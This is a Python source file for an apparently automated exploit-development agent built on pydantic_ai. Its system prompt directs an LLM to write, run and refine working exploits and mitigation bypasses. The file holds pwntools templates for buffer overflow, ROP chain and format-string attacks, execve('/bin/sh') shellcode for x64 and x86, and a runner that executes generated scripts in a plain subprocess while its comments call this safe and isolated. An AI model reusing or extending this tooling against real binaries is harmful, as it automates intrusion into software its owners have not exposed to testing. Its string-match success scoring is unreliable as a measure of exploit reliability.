import asyncio
import subprocess
import os
import tempfile
from typing import Dict, Any, List, Optional
from pydantic_ai import Agent
from pydantic_ai.settings import ModelSettings
from pydantic import BaseModel
from dotenv import load_dotenv

from utils.logging import send_log_message

load_dotenv()

class ExploitResult(BaseModel):
    """Result of exploit development from Baby Naptime"""
    vulnerability_type: str
    target_binary: str
    exploit_code: str
    success_rate: float
    bypass_techniques: List[str]
    payload_details: Dict[str, Any]
    impact_assessment: str

class ExploitDeveloper:
    """Exploit development functionality from Baby Naptime with script execution"""
    
    def __init__(self, llm_model: str = "o3-mini"):
        """Initialize exploit developer with script runner"""
        self.llm_model = llm_model
        self.temp_dir = "temp"
        os.makedirs(self.temp_dir, exist_ok=True)
    
    def run_exploit_script(self, file_path: str, script_code: str, timeout: Optional[int] = 30) -> str:
        """
        Run a Python exploit script safely in a subprocess.
        
        Args:
            file_path: Path to target binary
            script_code: Python exploit code to execute
            timeout: Maximum execution time in seconds
            
        Returns:
            Script execution results
        """
        try:
            # Create temporary script file
            fd, script_path = tempfile.mkstemp(suffix='.py', dir=self.temp_dir)
            
            # Prepare script with necessary imports and setup
            full_script = f"""
import os
import sys
import struct
import subprocess
from pwn import *

# Target binary path
target_binary = "{file_path}"

# User exploit code
{script_code}
"""
            
            with os.fdopen(fd, 'w') as f:
                f.write(full_script)

            # Run script in isolated subprocess
            result = subprocess.run(
                ['python3', script_path],
                capture_output=True,
                text=True,
                timeout=timeout,
                check=False  # Don't raise on non-zero exit
            )
            
            # Clean up
            os.unlink(script_path)
            
            return f"Exploit Code Executed:\n{script_code}\n\nOutput:\n{result.stdout}\n\nErrors:\n{result.stderr}"
            
        except subprocess.TimeoutExpired:
            return f"Exploit script timed out after {timeout} seconds"
        except Exception as e:
            return f"Error running exploit script: {str(e)}"
    
    def generate_buffer_overflow_exploit(self, binary_path: str, buffer_size: int, target_address: str) -> str:
        """Generate buffer overflow exploit code"""
        exploit_template = f"""
# Buffer Overflow Exploit for {binary_path}
from pwn import *

# Set up target
binary = ELF('{binary_path}')
p = process(binary.path)

# Exploit parameters
buffer_size = {buffer_size}
target_address = {target_address}

# Create payload
padding = b'A' * buffer_size
payload = padding + p64(target_address)

print(f"Sending payload of length: {{len(payload)}}")
print(f"Payload: {{payload}}")

# Send payload
p.sendline(payload)

# Check for success
try:
    response = p.recv(timeout=2)
    print(f"Response: {{response}}")
    if b"flag" in response or b"shell" in response:
        print("EXPLOIT SUCCESS!")
    else:
        print("Exploit may have failed")
except:
    print("No response received")

p.close()
"""
        return exploit_template
    
    def generate_rop_chain_exploit(self, binary_path: str, gadgets: List[str], target_function: str) -> str:
        """Generate ROP chain exploit code"""
        exploit_template = f"""
# ROP Chain Exploit for {binary_path}
from pwn import *

# Set up target
binary = ELF('{binary_path}')
p = process(binary.path)

# ROP gadgets (addresses need to be determined)
gadgets = {gadgets}
target_function = "{target_function}"

# Build ROP chain
rop = ROP(binary)

# Try to find target function
try:
    target_addr = binary.symbols[target_function]
    print(f"Found {{target_function}} at: {{hex(target_addr)}}")
    
    # Build basic ROP chain
    rop.call(target_addr)
    
    print(f"ROP chain: {{rop.dump()}}")
    
    # Create payload with ROP chain
    payload = b'A' * 40  # Adjust buffer size as needed
    payload += rop.chain()
    
    print(f"Sending ROP payload: {{payload}}")
    p.sendline(payload)
    
    # Check response
    response = p.recv(timeout=2)
    print(f"Response: {{response}}")
    
except KeyError:
    print(f"Function {{target_function}} not found in binary")
except Exception as e:
    print(f"ROP exploit failed: {{e}}")

p.close()
"""
        return exploit_template
    
    def generate_format_string_exploit(self, binary_path: str, format_offset: int) -> str:
        """Generate format string exploit code"""
        exploit_template = f"""
# Format String Exploit for {binary_path}
from pwn import *

# Set up target
binary = ELF('{binary_path}')
p = process(binary.path)

# Format string parameters
format_offset = {format_offset}

# Leak stack addresses
leak_payload = f"%{{format_offset}}$p.%{{format_offset+1}}$p.%{{format_offset+2}}$p"
print(f"Sending leak payload: {{leak_payload}}")

p.sendline(leak_payload.encode())
response = p.recv()
print(f"Leak response: {{response}}")

# Parse leaked addresses
try:
    leaked_addrs = response.decode().split('.')
    stack_addr = int(leaked_addrs[0], 16) if leaked_addrs[0].startswith('0x') else 0
    print(f"Leaked stack address: {{hex(stack_addr)}}")
    
    # Attempt to overwrite return address
    if stack_addr:
        target_addr = binary.symbols.get('main', 0x400000)  # Default or main
        write_payload = fmtstr_payload(format_offset, {{stack_addr: target_addr}})
        
        print(f"Sending write payload: {{write_payload}}")
        p.sendline(write_payload)
        
        response = p.recv(timeout=2)
        print(f"Write response: {{response}}")
        
except Exception as e:
    print(f"Format string exploit failed: {{e}}")

p.close()
"""
        return exploit_template

# Initialize exploit developer
exploit_dev = ExploitDeveloper()

model_settings = ModelSettings(temperature=0.01, max_tokens=16384)
exploit_agent = Agent(
    'openai:gpt-4o-mini',
    result_type=str,
    model_settings=model_settings,
    system_prompt="""
    You are a specialized Exploit Development and Validation agent using Baby Naptime methodology.
    Your expertise covers developing and validating proof-of-concept exploits with practical script execution:
    
    1. **Baby Naptime Exploit Development**:
       - Python-based exploit script generation and execution
       - Buffer overflow exploit chains with pwntools
       - Return-oriented programming (ROP) chains
       - Format string exploit development
       - Heap exploitation techniques with dynamic testing
    
    2. **Script-Based Exploitation**:
       - Automated exploit script generation
       - Real-time exploit testing and validation
       - Dynamic payload adjustment based on results
       - Interactive debugging and refinement
       - Success rate measurement through multiple runs
    
    3. **Bypass Techniques**:
       - ASLR bypass methods with address leaks
       - Stack canary bypass through format strings
       - DEP/NX bypass with ROP/JOP techniques
       - Heap protection bypass
       - Dynamic mitigation detection and adaptation
    
    **Baby Naptime Exploit Strategy:**
    - Generate Python exploit scripts using pwntools framework
    - Execute scripts against target binaries in controlled environment
    - Analyze execution results and refine exploits iteratively
    - Test exploit reliability through multiple execution cycles
    - Validate real-world attack scenarios with practical demonstrations
    
    **Exploit Development Process:**
    - Vulnerability analysis and exploitability assessment
    - Exploit primitive development with script generation
    - Payload crafting using pwntools and custom code
    - Dynamic testing and reliability improvement
    - Impact assessment through practical demonstration
    
    **Script Execution Focus:**
    - Generate working Python exploit code
    - Execute exploits against target binaries
    - Capture and analyze execution results
    - Iterate and improve exploit reliability
    - Demonstrate practical security impact
    
    **Validation:**
    - Confirm exploit functionality through execution
    - Test across different input conditions
    - Verify security impact claims with demonstrations
    - Assess attack complexity and reliability
    - Document exploitation methodology with working code
    
    If exploitable vulnerabilities are found, provide:
    - Working Python exploit code using pwntools
    - Execution results showing successful exploitation
    - Security mitigation bypass techniques demonstrated
    - Reliability assessment with success rate metrics
    - Real-world attack scenario documentation
    - Impact assessment with practical demonstrations
    
    If vulnerabilities are not exploitable, respond with "Vulnerabilities found but not exploitable under current conditions."
    If no vulnerabilities are provided for exploitation, respond with "No vulnerabilities provided for exploit development."
    """,
    retries=2,
)

@exploit_agent.tool
async def develop_buffer_overflow_exploit(vulnerability_details: str, target_binary: str, buffer_size: int = 40, target_address: str = "0x400000") -> str:
    """
    Develop and test a buffer overflow exploit using Baby Naptime methodology.
    
    Args:
        vulnerability_details: Details about the buffer overflow vulnerability
        target_binary: Path to the target binary
        buffer_size: Size of buffer to overflow
        target_address: Target address to redirect execution to
    """
    await send_log_message(f"Exploit Agent: Developing buffer overflow exploit for {target_binary}")
    
    try:
        # Generate exploit code
        exploit_code = exploit_dev.generate_buffer_overflow_exploit(target_binary, buffer_size, target_address)
        
        # Execute exploit script
        result = exploit_dev.run_exploit_script(target_binary, exploit_code)
        
        return f"Buffer Overflow Exploit Development:\n\nVulnerability: {vulnerability_details}\n\nGenerated Exploit:\n{exploit_code}\n\nExecution Results:\n{result}"
        
    except Exception as e:
        return f"Buffer overflow exploit development failed: {str(e)}"

@exploit_agent.tool
async def create_rop_chain_exploit(binary_path: str, target_function: str, gadgets: list = None) -> str:
    """
    Create and test a ROP (Return-Oriented Programming) chain exploit.
    
    Args:
        binary_path: Path to the target binary
        target_function: Target function to call via ROP
        gadgets: List of ROP gadgets (optional, will be discovered if not provided)
    """
    await send_log_message(f"Exploit Agent: Creating ROP chain exploit for {binary_path}, target: {target_function}")
    
    try:
        if not gadgets:
            # Try to find gadgets using ROPgadget if available
            try:
                rop_result = subprocess.run(['ROPgadget', '--binary', binary_path, '--only', 'pop|ret'], 
                                          capture_output=True, text=True, timeout=30)
                if rop_result.returncode == 0:
                    gadgets = rop_result.stdout.split('\n')[:10]  # Take first 10 gadgets
                else:
                    gadgets = ["# ROPgadget not available, using placeholder gadgets"]
            except:
                gadgets = ["# Gadget discovery failed, using manual analysis"]
        
        # Generate ROP exploit code
        exploit_code = exploit_dev.generate_rop_chain_exploit(binary_path, gadgets, target_function)
        
        # Execute exploit script
        result = exploit_dev.run_exploit_script(binary_path, exploit_code)
        
        return f"ROP Chain Exploit Development:\n\nTarget Function: {target_function}\nGadgets Found: {len(gadgets)}\n\nGenerated Exploit:\n{exploit_code}\n\nExecution Results:\n{result}"
        
    except Exception as e:
        return f"ROP chain exploit development failed: {str(e)}"

@exploit_agent.tool
async def develop_format_string_exploit(binary_path: str, format_offset: int = 6) -> str:
    """
    Develop and test a format string exploit.
    
    Args:
        binary_path: Path to the target binary
        format_offset: Offset to format string parameter on stack
    """
    await send_log_message(f"Exploit Agent: Developing format string exploit for {binary_path}")
    
    try:
        # Generate format string exploit code
        exploit_code = exploit_dev.generate_format_string_exploit(binary_path, format_offset)
        
        # Execute exploit script
        result = exploit_dev.run_exploit_script(binary_path, exploit_code)
        
        return f"Format String Exploit Development:\n\nFormat Offset: {format_offset}\n\nGenerated Exploit:\n{exploit_code}\n\nExecution Results:\n{result}"
        
    except Exception as e:
        return f"Format string exploit development failed: {str(e)}"

@exploit_agent.tool
async def test_exploit_reliability(exploit_code: str, target_binary: str, iterations: int = 10) -> str:
    """
    Test exploit reliability across multiple executions using Baby Naptime methodology.
    
    Args:
        exploit_code: The exploit code to test
        target_binary: Path to the target binary
        iterations: Number of test iterations
    """
    await send_log_message(f"Exploit Agent: Testing exploit reliability for {target_binary} over {iterations} iterations")
    
    try:
        success_count = 0
        results = []
        
        for i in range(iterations):
            try:
                result = exploit_dev.run_exploit_script(target_binary, exploit_code, timeout=10)
                
                # Check for success indicators
                if any(indicator in result.lower() for indicator in ['success', 'flag', 'shell', 'exploit']):
                    success_count += 1
                    results.append(f"Iteration {i+1}: SUCCESS")
                else:
                    results.append(f"Iteration {i+1}: FAILED")
                    
            except Exception as e:
                results.append(f"Iteration {i+1}: ERROR - {str(e)}")
        
        success_rate = (success_count / iterations) * 100
        
        reliability_report = f"Exploit Reliability Testing:\n\n"
        reliability_report += f"Target Binary: {target_binary}\n"
        reliability_report += f"Iterations: {iterations}\n"
        reliability_report += f"Successes: {success_count}\n"
        reliability_report += f"Success Rate: {success_rate:.1f}%\n\n"
        reliability_report += "Detailed Results:\n" + '\n'.join(results[:10])  # Show first 10
        
        if success_rate >= 80:
            reliability_report += f"\n\n✅ HIGHLY RELIABLE EXPLOIT (>80% success rate)"
        elif success_rate >= 50:
            reliability_report += f"\n\n⚠️  MODERATELY RELIABLE EXPLOIT (50-80% success rate)"
        else:
            reliability_report += f"\n\n❌ UNRELIABLE EXPLOIT (<50% success rate)"
        
        return reliability_report
        
    except Exception as e:
        return f"Exploit reliability testing failed: {str(e)}"

@exploit_agent.tool
async def generate_custom_payload(payload_type: str, architecture: str = "x64", target_binary: str = None) -> str:
    """
    Generate custom payload for exploit development.
    
    Args:
        payload_type: Type of payload (shellcode, rop_chain, format_string, etc.)
        architecture: Target architecture (x86, x64, ARM)
        target_binary: Optional target binary for context
    """
    await send_log_message(f"Exploit Agent: Generating {payload_type} payload for {architecture}")
    
    try:
        if payload_type.lower() == "shellcode":
            payload_code = f"""
# Shellcode Payload Generation for {architecture}
from pwn import *

context.arch = '{architecture}'
context.os = 'linux'

# Generate shellcode
if '{architecture}' == 'x64':
    # x64 execve("/bin/sh") shellcode
    shellcode = asm('''
        xor rdi, rdi
        push rdi
        push 0x68732f2f
        push 0x6e69622f
        mov rdi, rsp
        xor rsi, rsi
        xor rdx, rdx
        mov rax, 59
        syscall
    ''')
else:
    # x86 execve("/bin/sh") shellcode
    shellcode = asm('''
        xor eax, eax
        push eax
        push 0x68732f2f
        push 0x6e69622f
        mov ebx, esp
        xor ecx, ecx
        xor edx, edx
        mov al, 11
        int 0x80
    ''')

print(f"Generated shellcode ({architecture}): {{shellcode}}")
print(f"Shellcode length: {{len(shellcode)}}")
print(f"Shellcode hex: {{shellcode.hex()}}")
"""
        
        elif payload_type.lower() == "nop_sled":
            payload_code = f"""
# NOP Sled Generation for {architecture}
from pwn import *

context.arch = '{architecture}'

# Generate NOP sled
nop_count = 100
if '{architecture}' == 'x64':
    nop_sled = b'\\x90' * nop_count  # x64 NOP
else:
    nop_sled = b'\\x90' * nop_count  # x86 NOP

print(f"Generated NOP sled: {{nop_sled}}")
print(f"NOP sled length: {{len(nop_sled)}}")
"""
        
        else:
            payload_code = f"""
# Custom Payload Generation for {payload_type}
from pwn import *

# Generic payload template
payload = b'A' * 100  # Adjust size as needed
print(f"Generated {payload_type} payload: {{payload}}")
print(f"Payload length: {{len(payload)}}")
"""
        
        # Execute payload generation script
        if target_binary:
            result = exploit_dev.run_exploit_script(target_binary, payload_code)
        else:
            result = exploit_dev.run_exploit_script("/tmp/dummy", payload_code)
        
        return f"Custom Payload Generation:\n\nType: {payload_type}\nArchitecture: {architecture}\n\nGenerated Code:\n{payload_code}\n\nExecution Results:\n{result}"
        
    except Exception as e:
        return f"Custom payload generation failed: {str(e)}"

@exploit_agent.tool
async def analyze_exploit_success(exploit_output: str, target_binary: str) -> str:
    """
    Analyze exploit execution output to determine success and impact.
    
    Args:
        exploit_output: Output from exploit execution
        target_binary: Target binary that was exploited
    """
    await send_log_message(f"Exploit Agent: Analyzing exploit success for {target_binary}")
    
    try:
        success_indicators = [
            'exploit success', 'shell spawned', 'flag{', 'root@',
            'segmentation fault', 'sigsegv', 'crash detected',
            'return address overwritten', 'control flow hijacked'
        ]
        
        failure_indicators = [
            'exploit failed', 'connection refused', 'timeout',
            'permission denied', 'no such file', 'compilation error'
        ]
        
        found_success = []
        found_failure = []
        
        output_lower = exploit_output.lower()
        
        for indicator in success_indicators:
            if indicator in output_lower:
                found_success.append(indicator)
        
        for indicator in failure_indicators:
            if indicator in output_lower:
                found_failure.append(indicator)
        
        analysis = f"Exploit Success Analysis for {target_binary}:\n\n"
        
        if found_success:
            analysis += f"✅ SUCCESS INDICATORS FOUND:\n"
            for indicator in found_success:
                analysis += f"  - {indicator}\n"
            analysis += "\n"
        
        if found_failure:
            analysis += f"❌ FAILURE INDICATORS FOUND:\n"
            for indicator in found_failure:
                analysis += f"  - {indicator}\n"
            analysis += "\n"
        
        # Overall assessment
        if found_success and not found_failure:
            analysis += "🎯 ASSESSMENT: EXPLOIT SUCCESSFUL\n"
            analysis += "The exploit appears to have executed successfully and achieved its objective.\n"
        elif found_success and found_failure:
            analysis += "⚠️  ASSESSMENT: PARTIAL SUCCESS\n"
            analysis += "The exploit shows signs of both success and failure - may need refinement.\n"
        elif found_failure:
            analysis += "❌ ASSESSMENT: EXPLOIT FAILED\n"
            analysis += "The exploit failed to execute properly or achieve its objective.\n"
        else:
            analysis += "❓ ASSESSMENT: UNCLEAR RESULTS\n"
            analysis += "The exploit output doesn't clearly indicate success or failure.\n"
        
        analysis += f"\nFull Output Analysis:\n{exploit_output[:1000]}..."  # First 1000 chars
        
        return analysis
        
    except Exception as e:
        return f"Exploit success analysis failed: {str(e)}"